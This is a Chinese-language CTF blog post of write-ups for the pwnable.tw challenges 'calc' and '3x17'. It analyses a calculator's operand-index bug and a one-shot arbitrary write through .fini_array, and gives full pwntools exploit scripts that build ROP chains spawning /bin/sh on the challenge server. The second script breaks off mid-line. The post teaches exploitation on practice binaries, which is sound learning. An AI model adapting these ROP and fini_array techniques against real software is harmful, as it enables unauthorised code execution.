@@ -1,0 +1,1156 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="n0va的ctf博客" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="calc不愧是pwnable，质量果然高，学到了不少姿势，看题目很明显程序是一个计算器，但漏洞点在哪，着实让我这个小菜鸡绞尽脑汁，起初试图独自解决，最后还是迫于现实膜一了波大佬的write up 。 程序分析保护  开启了canary 跟NX">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwnable.tw系列">
+<meta property="og:url" content="http://yoursite.com/2019/07/03/pwnable.tw/index.html">
+<meta property="og:site_name" content="n0va的ctf博客">
+<meta property="og:description" content="calc不愧是pwnable，质量果然高，学到了不少姿势，看题目很明显程序是一个计算器，但漏洞点在哪，着实让我这个小菜鸡绞尽脑汁，起初试图独自解决，最后还是迫于现实膜一了波大佬的write up 。 程序分析保护  开启了canary 跟NX">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/images/pwnable.tw/2.jpg">
+<meta property="og:image" content="http://yoursite.com/images/pwnable.tw/1.jpg">
+<meta property="og:image" content="http://yoursite.com/images/pwnable.tw/3.jpg">
+<meta property="og:image" content="http://yoursite.com/images/pwnable.tw/4.jpg">
+<meta property="og:image" content="http://yoursite.com/images/pwnable.tw/5.jpg">
+<meta property="og:image" content="http://yoursite.com/images/pwnable.tw/6.jpg">
+<meta property="og:image" content="http://yoursite.com/images/pwnable.tw/7.jpg">
+<meta property="og:image" content="http://yoursite.com/pwnable.tw/8.jpg">
+<meta property="og:image" content="http://yoursite.com/images/pwnable.tw/9.jpg">
+<meta property="og:image" content="http://yoursite.com/images/pwnable.tw/10.jpg">
+<meta property="og:image" content="http://yoursite.com/images/pwnable.tw/6.jpg">
+<meta property="og:image" content="http://yoursite.com/images/pwnable.tw/11.jpg">
+<meta property="og:image" content="http://yoursite.com/images/pwnable.tw/12.jpg">
+<meta property="og:image" content="http://yoursite.com/images/pwnable.tw/16.jpg">
+<meta property="og:image" content="http://yoursite.com/images/pwnable.tw/13.jpg">
+<meta property="og:image" content="http://yoursite.com/images/pwnable.tw/14.jpg">
+<meta property="og:image" content="http://yoursite.com/images/pwnable.tw/15.jpg">
+<meta property="og:updated_time" content="2019-07-03T14:12:04.833Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="pwnable.tw系列">
+<meta name="twitter:description" content="calc不愧是pwnable，质量果然高，学到了不少姿势，看题目很明显程序是一个计算器，但漏洞点在哪，着实让我这个小菜鸡绞尽脑汁，起初试图独自解决，最后还是迫于现实膜一了波大佬的write up 。 程序分析保护  开启了canary 跟NX">
+<meta name="twitter:image" content="http://yoursite.com/images/pwnable.tw/2.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/07/03/pwnable.tw/">
+
+
+
+
+
+  <title>pwnable.tw系列 | n0va的ctf博客</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">n0va的ctf博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/03/pwnable.tw/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="n0va">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/n0va.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="n0va的ctf博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">pwnable.tw系列</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-03T00:00:00+08:00">
+                2019-07-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><p>不愧是pwnable，质量果然高，学到了不少姿势，看题目很明显程序是一个计算器，但漏洞点在哪，着实让我这个小菜鸡绞尽脑汁，起初试图独自解决，最后还是迫于现实膜一了波大佬的write up 。</p>
+<h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>保护</p>
+<p><img src="\images\pwnable.tw\2.jpg" alt></p>
+<p>开启了canary 跟NX</p>
+<a id="more"></a>
+<h4 id="主函数calc"><a href="#主函数calc" class="headerlink" title="主函数calc"></a>主函数calc</h4><p><img src="\images\pwnable.tw\1.jpg" alt></p>
+<p>get_expr用来存放计算公式的，init_pool是一个初始化函数，将v1数组初始化为0，<code>bzero(&amp;s,0x400) == memset(s,0,0x400)</code>，parse_expr函数便是这个程序的关键，用来计算结果的。</p>
+<h4 id="分析parse-expr函数"><a href="#分析parse-expr函数" class="headerlink" title="分析parse_expr函数"></a>分析parse_expr函数</h4><p>该函数主要分为两个步骤：解析运算表达式、计算运算结果 。</p>
+<p>该函数两个参数，参数1为用户输入的运算表达式的地址，参数2为init_pool函数初始化的v1数组（下文命名为initpool）</p>
+<p><img src="\images\pwnable.tw\3.jpg" alt></p>
+<p>函数分配了100字节的空间给一个数组<code>operator[100]</code>，用来保存所有的操作符，其实函数的漏洞就在这个运算过程中，所以我们要先很清楚地熟悉parse_expr函数的运算过程。</p>
+<p>首先，函数进入一个大循环，对运算表达式的每一个字符分析处理，判断条件：当前字符的ASCII码值-48如果 大于9，则将其识别为运算符；反之识别为数字处理。这时候大家可能会有两个疑问：1、ASCII码小于48的字符可不止运算符，大于48的也不止数字呀 ；2、“+，-，x，/，%”这几个运算符可都比48小，-48就是负数了，也肯定小于9啊。第一，早在get_expr函数输入运算式的时候就已经限定了输入的字符只能是数字和”+-*/%”</p>
+<p><img src="\images\pwnable.tw\4.jpg" alt></p>
+<p>第二、”+-*/%”的ASCII虽然小于48，但是程序定义的差值是无符号整形(unsigned int)，所以作为一个无符号的数，小于48减去48是远远大于9的。</p>
+<p><img src="\images\pwnable.tw\5.jpg" alt></p>
+<p>继续往下讲，如果当前字符为数字，那么循环中什么也不做，i++继续往下遍历，如果当前字符为运算符，函数要做的第一件事是将前面的字符转化为整数保存起来，保存在哪呢？就保存在initpool数组中</p>
+<p><img src="\images\pwnable.tw\6.jpg" alt></p>
+<p>从逻辑来看操作数是从<code>initpool[1]</code>的位置开始保存的，那么问题来了<code>initpool[0]</code>用来干嘛呢，从<code>count=(*initpool)++</code>这一句来看<code>initpool[0]</code>保存的应该是当前运算数的个数，(正常下固定为2，因为一个操作符两个操作数)，由此可见，程序两个最重要的数据结构为<code>initpool[]和operator[]</code>，一个存操作数一个存操作符。</p>
+<p>接下来为了保证输入的表达式是合法的，函数对当前操作符的下一个字符进行了判断若后一个字符也是操作符的话，则视当前表达式非法，退出此次运算。</p>
+<p><img src="\images\pwnable.tw\7.jpg" alt></p>
+<p>接下来就是parse_expr的关键部分了，运算。</p>
+<p><img src="\pwnable.tw\8.jpg" alt></p>
+<p>当处理到操作符是，判断是否为第一个操作符，是的话进入else，将当前操作符保存在<code>operator[v7]</code>中，也就是<code>operator[0]</code>，如果不是第一个操作符的话进入if条件。if的作用：保存当前操作符至operator数组中，并进行之前操作符所对应的运算，举个例子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1+3-2</span><br></pre></td></tr></table></figure>
+<p>当处理到”+”时，由于这是第一个运算符，函数只是将其左值 “1” 保存至<code>initpool[1]</code>中，并将 “+” 保存至<code>operator[0]</code>中，然后继续循环。当处理到 “-“ 时，因为inipool中已经有两个值”1”和”3”，而且operator中也保存了一个值 “+” ，也就是说，此时两个数组中的情况为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">initpool[0]=2,initpool[1]=1,initpool[2]=3</span><br><span class="line">operator[0]=&quot;+&quot;</span><br></pre></td></tr></table></figure>
+<p>将1和3进行加法运算并保存起来，这就是eval函数做的事</p>
+<h4 id="eval函数"><a href="#eval函数" class="headerlink" title="eval函数"></a>eval函数</h4><p><img src="\images\pwnable.tw\9.jpg" alt></p>
+<p>eval函数将”1+3”的计算结果”4”保存在之前”1”的位置，也就是<code>initpool[initpool[0]-1]=initpool[1]</code>中，（注意，这里的保存位置iniptool[1]是由initpool[0]相对确定的），这样一来，情况就是这样的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">initpool[0]=2,initpool[1]=4,initpool[2]=2</span><br><span class="line">operator[0]=&quot;+&quot;,operator[1]=&quot;-&quot;</span><br></pre></td></tr></table></figure>
+<p>函数接下来就会通过eval计算”4-2”，并将运算结果仍然保存在<code>initpool[1]</code>中。程序经过多次运算，最终会将计算结果输出给用户：</p>
+<p><img src="\images\pwnable.tw\10.jpg" alt></p>
+<p>上图中，<code>ebp+var_5A0为initpool[0]的位置，ebp+var_59C为initpool[1]的位置</code>，因此，（注意）程序输入给用户的结果为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">initpool[1+initpool[0]-1] = initpool[initpool[0]]</span><br></pre></td></tr></table></figure>
+<p>至此，程序的逻辑算是勉勉强强弄懂了，那么，漏洞在哪 呢？</p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>其实我不看writeup 过了一遍又遍的程序还是没能找到漏洞，漏洞就出现在上文提到注意的地方。</p>
+<p>虽然eval函数看似每次都将算运结果放到了<code>initpool[1]</code>中去，但是实际上这个下标”1”是由<code>initpool[0]-1</code>得到的，上文也提到正常情况下<code>initpool[0]</code>固定等于2的，因此我们总能将计算结果放到<code>initpool[1]</code>中去，并且最终将结果输出给用户。如果 我们能控制<code>initpool[0]</code>的值呢？这样我们相当于能实现任意地址读写了。</p>
+<p>我们回头去看一下initpool[0]的值是怎么确定的，</p>
+<p><img src="\images\pwnable.tw\6.jpg" alt></p>
+<p>这一串代码的意思就是：若运算符左边的操作数存在，那么就将操作数放到<code>initpool[initpool[0]+1]</code>上并且<code>initpool[0]++</code>，所以，如果左边的操作数不存在呢，那么initpool[0]就不会+1，当解析到下一个操作符时，initpool[0]才加一，那么进入eval函数计算时就是这样的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">比如输入+300的情况如下 </span><br><span class="line">initpool[0]=1,initpool[1]=300</span><br><span class="line">operator[0]=&quot;+&quot;</span><br></pre></td></tr></table></figure>
+<p>最终的计算结果会放到<code>initpool[initpool[0]-1] == initpool[0]</code>，也就是<code>initpool[0]=301</code>这样，通过畸形的运算式我们就能控制<code>initpool[0]</code>的值了，接下来只需要计算好返回地址跟initpool[0]的偏移就可以进行地址的读写了</p>
+<p><img src="\images\pwnable.tw\11.jpg" alt></p>
+<p>接下来就是构造ROP链执行<code>execve(&quot;/bin/sh&quot;,0,0)</code>因为这里需要用到是的参数”/bin/sh”的地址，我的做法是泄漏出栈地址，往栈中写入”/bin/sh”，然后将”/bin/sh”的地址做为参数。</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># initpool -&gt; 0xffffc818 1(a)</span></span><br><span class="line"><span class="comment"># 			0xffffc81c result == 0xffffc81c + 4*(a-1)</span></span><br><span class="line"><span class="comment"># 			0xffffc820 count</span></span><br><span class="line"><span class="comment"># 			0xffffc824 </span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process('./calc')</span></span><br><span class="line">p = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="string">"10100"</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pop_eax = <span class="number">0x0805c34b</span></span><br><span class="line"><span class="comment"># pop_ebx = 0x080481d1</span></span><br><span class="line">pop_ecx_ebx = <span class="number">0x080701d1</span></span><br><span class="line">pop_edx = <span class="number">0x080701aa</span></span><br><span class="line">int_0x80 = <span class="number">0x08049a21</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(data)</span>:</span></span><br><span class="line">	<span class="keyword">if</span> data&gt;<span class="number">0</span>:</span><br><span class="line">		payload = <span class="string">'+'</span> + str(data)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		payload = <span class="string">'-'</span> + str(-data)</span><br><span class="line">	<span class="keyword">return</span> payload</span><br><span class="line">p.recvuntil(<span class="string">"=== Welcome to SECPROG calculator ===\n"</span>)</span><br><span class="line"><span class="comment"># +361 :ret_addr</span></span><br><span class="line"><span class="comment"># gdb.attach(p,"b *0x80493F2")</span></span><br><span class="line"><span class="comment"># 0x8048F45 +</span></span><br><span class="line"><span class="comment"># 0x8048F79 -</span></span><br><span class="line">p.sendline(<span class="string">'+360'</span>)</span><br><span class="line">stack_addr = <span class="number">0xffffffff</span> + int(p.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>],<span class="number">10</span>) + <span class="number">1</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"stack_addr --&gt; "</span> + hex(stack_addr)</span><br><span class="line">binsh_addr = stack_addr + <span class="number">4</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"binsh_addr --&gt; "</span> + hex(binsh_addr)</span><br><span class="line"><span class="comment">#pop_eax 11</span></span><br><span class="line">p.sendline(<span class="string">'+361'</span>)</span><br><span class="line">data = pop_eax - int(p.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>],<span class="number">10</span>)</span><br><span class="line">p.sendline(<span class="string">'+361'</span> + exp(data))</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'+362'</span>)</span><br><span class="line">data = <span class="number">11</span> - int(p.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>],<span class="number">10</span>)</span><br><span class="line">p.sendline(<span class="string">'+362'</span> + exp(data))</span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#pop_ecx_ebx 0,binsh_addr</span></span><br><span class="line">p.sendline(<span class="string">'+363'</span>)</span><br><span class="line">data = pop_ecx_ebx - int(p.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>],<span class="number">10</span>)</span><br><span class="line">p.sendline(<span class="string">'+363'</span> + exp(data))</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'+364'</span>)</span><br><span class="line">data = <span class="number">0</span> - int(p.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>],<span class="number">10</span>)</span><br><span class="line">p.sendline(<span class="string">'+364'</span> + exp(data))</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'+365'</span>)</span><br><span class="line">data = int(p.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>],<span class="number">10</span>)</span><br><span class="line">payload = <span class="number">0xffffffff</span> - binsh_addr + data + <span class="number">1</span></span><br><span class="line">p.sendline(<span class="string">'+365-'</span> + str(payload))</span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#pop edx 0</span></span><br><span class="line">p.sendline(<span class="string">'+366'</span>)</span><br><span class="line">data = pop_edx - int(p.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>],<span class="number">10</span>)</span><br><span class="line">p.sendline(<span class="string">'+366'</span> + exp(data))</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'+367'</span>)</span><br><span class="line">data = <span class="number">0</span> - int(p.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>],<span class="number">10</span>)</span><br><span class="line">p.sendline(<span class="string">'+367'</span> + exp(data))</span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#int_0x80</span></span><br><span class="line">p.sendline(<span class="string">'+368'</span>)</span><br><span class="line">data = int_0x80 - int(p.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>],<span class="number">10</span>)</span><br><span class="line">p.sendline(<span class="string">'+368'</span> + exp(data))</span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#/bin/sh\x00</span></span><br><span class="line">p.sendline(<span class="string">'+369'</span>)</span><br><span class="line">data = <span class="number">0x6e69622f</span> - int(p.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>],<span class="number">10</span>)</span><br><span class="line">p.sendline(<span class="string">'+369'</span> + exp(data))</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'+370'</span>)</span><br><span class="line">data = <span class="number">0x0068732f</span> - int(p.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>],<span class="number">10</span>)</span><br><span class="line">p.sendline(<span class="string">'+370'</span> + exp(data))</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>参考博客：<a href="https://www.tuicool.com/articles/VNzqea3" target="_blank" rel="noopener">https://www.tuicool.com/articles/VNzqea3</a> 写得太好太详细了吧！</p>
+<h2 id="3x17"><a href="#3x17" class="headerlink" title="3x17"></a>3x17</h2><p>这也是一道很神奇的题，很巧妙，很佩服。</p>
+<h3 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h3><p><img src="\images\pwnable.tw\12.jpg" alt></p>
+<p>程序很简单，任意地址写，且只能写一次，一开始看到这里我很开心，这不是送分嘛！但是……….但是，，一次的任意地址写，有啥用？我开始懵了，看了writeup 才发现触及到了我的知识盲区</p>
+<p><img src="\images\pwnable.tw\16.jpg" alt></p>
+<p>程序在这时设置了参数byte_4b9330每次都加1 即使能够调用回到main函数也无法再次使用任意地址写这个功能。</p>
+<h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>很明显了就是任意地址写了，但是要怎么去用它呢。这里涉及到了一个新知识（对于我来说）有一个新东西叫做.fini_array,是程序执行完毕之势执行的函数，这个数组里存着两个函数地址，这个数组 的两个函数以倒序依次被 执行，我们可以通修改.fini_array的内容来控制程序的执行流，根据这个数组调用，可以找到实际调用函数的位置，（IDA中shift +F7 可查看所以段，可以快速找到.fini_array段）</p>
+<p><img src="\images\pwnable.tw\13.jpg" alt></p>
+<p>gdb下个断看一下这里的调用是干嘛的</p>
+<p><img src="\images\pwnable.tw\14.jpg" alt></p>
+<p><img src="\images\pwnable.tw\15.jpg" alt></p>
+<p>可以看到rbp为<code>0x4b40f0</code>即<code>.fini_array</code>也就是arr[1]，继续调试，可以看到rbx变为0之后跟-1比较cmp不相等，因此次调用执行<code>call[rbp+rbx*8+0]</code>,即调试arr[0]，刚好符合我们查到的：倒序调用，所以我们现在要做的就是修改<code>.fini_array</code>数组构造一个无循环疯狂加调main函数，这样参数<code>byte_4b9330</code>就会疯狂加1 ，最终会回到0(0xff + 1 -&gt; 0)，这样我们就可以再次用到任意地址写这个功能。</p>
+<p>我的做法是将arr[1]改为main，arr[0]改为调用<code>.fini_array</code>的函数也就是<code>0x402960</code>，这样的效果就是，调用arr[1]进入了main函数，出来调用了arr[0]又过来调用arr[1]进入main函数，然后继续调用arr[0]来调用main………疯狂调用main。这样就能实现多次的任意地址写了，接下来就构造ROP链，实现系统调用<code>execve(&#39;/bin/sh&#39;,0,0)</code>。</p>
+<p>要让这个循环停下来只需要在ROP链构造完成后让arr[0]为leave_ret_addr即可。</p>
+<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment"># p = process('./3x17')</span></span><br><span class="line">p = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="string">"10105"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(addr,value)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">	p.sendline(str(addr))</span><br><span class="line">	p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">	p.send(str(value))</span><br><span class="line">fini_array = <span class="number">0x4b40f0</span></span><br><span class="line">main = <span class="number">0x401b6d</span></span><br><span class="line">loop_call = <span class="number">0x402960</span></span><br><span class="line">pop_rax = <span class="number">0x41e4af</span></span><br><span class="line">leave_ret = <span class="number">0x401c4b</span></span><br><span class="line">binsh_addr = <span class="number">0x4B9300</span></span><br><span class="line">pop_rdi = <span class="number">0x401696</span></span><br><span class="line">pop_rdx = <span class="number">0x446e35</span></span><br><span class="line">pop_rsi = <span class="number">0x406c30</span></span><br><span class="line">syscall = <span class="number">0x471db5</span></span><br><span class="line"><span class="comment"># execve = 0x3b</span></span><br><span class="line"><span class="comment"># rdi,rsi,rdx</span></span><br><span class="line"><span class="comment"># write(binsh_addr, p64(0x68732f6e69622f))</span></span><br><span class="line"><span class="comment"># pop_rdi binsh_addr</span></span><br><span class="line"><span class="comment"># pop_rsi 0</span></span><br><span class="line"><span class="comment"># pop_rdx 0</span></span><br><span class="line"><span class="comment"># pop_rax 0x3b</span></span><br><span class="line"><span class="comment"># syscall</span></span><br><span class="line"></span><br><span class="line">write(fini_array,p64(loop_call) + p64(main))</span><br><span class="line"><span class="comment"># write(binsh_addr, p64(0x68732f6e69622f))</span></span><br><span class="line">write(binsh_addr,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">write(fini_array + <span class="number">0x10</span>,p64(pop_rdi) + p64(binsh_addr))</span><br><span class="line">write(fini_array + <span class="number">0x20</span>,p64(pop_rsi) + p64(<span class="number">0</span>))</span><br><span class="line">write(fini_array + <span 